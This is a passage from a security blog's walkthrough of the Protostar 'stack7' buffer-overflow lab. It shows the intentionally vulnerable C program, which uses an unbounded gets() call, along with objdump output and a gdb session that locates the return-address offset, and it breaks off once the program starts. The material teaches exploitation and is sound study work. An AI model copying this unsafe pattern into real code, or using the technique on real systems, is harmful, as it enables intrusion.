
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../Protostar_stack6/">
      
      
        <link rel="next" href="../bamboofox-ret2syscall-rop/">
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
    
    
      
        <title>Protostar stack7 - DarkLord-W's Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#source-code" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="DarkLord-W&#39;s Blog" class="md-header__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
      
  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            DarkLord-W's Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Protostar stack7
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="DarkLord-W&#39;s Blog" class="md-nav__button md-logo" aria-label="DarkLord-W's Blog" data-md-component="logo">
      
  <img src="https://avatars.githubusercontent.com/u/42199147" alt="logo">

    </a>
    DarkLord-W's Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    PortSwigger Academy
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            PortSwigger Academy
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../PortSwigger-Academy/File%20upload%20vulnerabilities/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    File upload vulnerabilities
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pwn
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Pwn
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_format0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar format0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_format1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar format1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_format2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar format2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_heap0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar heap0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_heap1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar heap1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_stack0/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack0
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_stack1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_stack2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_stack3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack3
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_stack4/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar_stack4
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_stack5/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar stack5
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Protostar_stack6/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Protostar stack6
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Protostar stack7
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Protostar stack7
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#source-code" class="md-nav__link">
    <span class="md-ellipsis">
      Source code
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bamboofox-ret2syscall-rop/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    bamboofox-ret2syscall-rop
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwn-sniper-01/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwn-sniper-01
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwn-sniper-02/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwn-sniper-02
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwn-sniper-03/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwn-sniper-03
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwnable--bof/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--bof
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwnable--collision/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--collision
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwnable--fd%20--%20%28File%20descriptor%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--fd -- (File descriptor)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwnable--flag--%28reverse%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--flag--(reverse)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwnable--input/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--input
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwnable--passcode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--passcode
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwnable--random/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    pwnable--random
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ret2shellcode/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ret2shellcode
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../stack_test/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    stack_test
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../xctf--pwn--%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    xctf--pwn--反应釜开关控制
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Web
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ATTCK红队评估01
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ATTCK红队评估02
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../web/HTB%20Pilgrimage/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HTB Pilgrimage
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../web/tryhackme%20-%20Overpass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    tryhackme - Overpass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../web/vulhub%20%20%20%20DC-9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    vulhub    DC-9
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../web/vulhub%20%20%20%20DIGITALWORLD.LOCAL_%20BRAVERY/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    vulhub    DIGITALWORLD.LOCAL: BRAVERY
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#source-code" class="md-nav__link">
    <span class="md-ellipsis">
      Source code
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Protostar stack7</h1>

<div class="highlight"><pre><span></span><code># Stack Seven

Stack6 introduces return to .text to gain code execution.

The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

This level is at /opt/protostar/bin/stack7
</code></pre></div>
<h2 id="source-code">Source code</h2>
<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>

<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="nf">getpath</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;input path please: &quot;</span><span class="p">);</span><span class="w"> </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

<span class="w">  </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__builtin_return_address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="n">ret</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xb0000000</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xb0000000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;bzzzt (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="p">);</span>
<span class="w">      </span><span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;got path %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">getpath</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>
<hr />
<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="o">-</span><span class="n">j</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w"> </span><span class="n">stack7</span><span class="w">           </span>

<span class="nl">stack7</span><span class="p">:</span><span class="w">     </span><span class="n">file</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>

<span class="n">SYMBOL</span><span class="w"> </span><span class="n">TABLE</span><span class="o">:</span>
<span class="mi">08048410</span><span class="w"> </span><span class="n">l</span><span class="w">    </span><span class="n">d</span><span class="w">  </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000000</span><span class="w">              </span><span class="p">.</span><span class="n">text</span>
<span class="mi">08048440</span><span class="w"> </span><span class="n">l</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000000</span><span class="w">              </span><span class="n">__do_global_dtors_aux</span>
<span class="mi">080484</span><span class="n">a0</span><span class="w"> </span><span class="n">l</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000000</span><span class="w">              </span><span class="n">frame_dummy</span>
<span class="mi">080485</span><span class="n">d0</span><span class="w"> </span><span class="n">l</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000000</span><span class="w">              </span><span class="n">__do_global_ctors_aux</span>
<span class="mi">08048560</span><span class="w"> </span><span class="n">g</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000005</span><span class="w">              </span><span class="n">__libc_csu_fini</span>
<span class="mi">08048410</span><span class="w"> </span><span class="n">g</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000000</span><span class="w">              </span><span class="n">_start</span>
<span class="mi">08048570</span><span class="w"> </span><span class="n">g</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">0000005</span><span class="n">a</span><span class="w">              </span><span class="n">__libc_csu_init</span>
<span class="mi">080484</span><span class="n">c4</span><span class="w"> </span><span class="n">g</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">000000</span><span class="mi">81</span><span class="w">              </span><span class="n">getpath</span>
<span class="mi">080485</span><span class="n">ca</span><span class="w"> </span><span class="n">g</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mo">00000000</span><span class="w">              </span><span class="p">.</span><span class="n">hidden</span><span class="w"> </span><span class="n">__i686</span><span class="p">.</span><span class="n">get_pc_thunk</span><span class="p">.</span><span class="n">bx</span>
<span class="mi">08048545</span><span class="w"> </span><span class="n">g</span><span class="w">     </span><span class="n">F</span><span class="w"> </span><span class="p">.</span><span class="n">text</span><span class="w">  </span><span class="mf">0000000f</span><span class="w">              </span><span class="n">main</span>
</code></pre></div>
<p><em><em>计算偏移量</em>(可以看到偏移量为80)</em></p>
<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span>
<span class="n">Successfully</span><span class="w"> </span><span class="n">imported</span><span class="w"> </span><span class="n">six</span><span class="w"> </span><span class="n">module</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">stack7</span>
<span class="n">Reading</span><span class="w"> </span><span class="n">symbols</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">stack7</span><span class="p">...</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="n">main</span>
<span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0x804854b</span><span class="o">:</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">stack7</span><span class="o">/</span><span class="n">stack7</span><span class="p">.</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mf">28.</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">pattern_create</span><span class="w"> </span><span class="mi">200</span>
<span class="err">&#39;</span><span class="n">AAA</span><span class="o">%</span><span class="n">AAsAABAA$AAnAACAA</span><span class="o">-</span><span class="n">AA</span><span class="p">(</span><span class="n">AADAA</span><span class="p">;</span><span class="n">AA</span><span class="p">)</span><span class="n">AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><span class="err">&#39;</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">run</span>
<span class="n">Starting</span><span class="w"> </span><span class="n">program</span><span class="o">:</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">stack7</span><span class="w"> </span>
<span class="p">[</span><span class="n">Thread</span><span class="w"> </span><span class="n">debugging</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">enabled</span><span class="p">]</span>
<span class="n">Using</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="s">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span><span class="p">.</span>
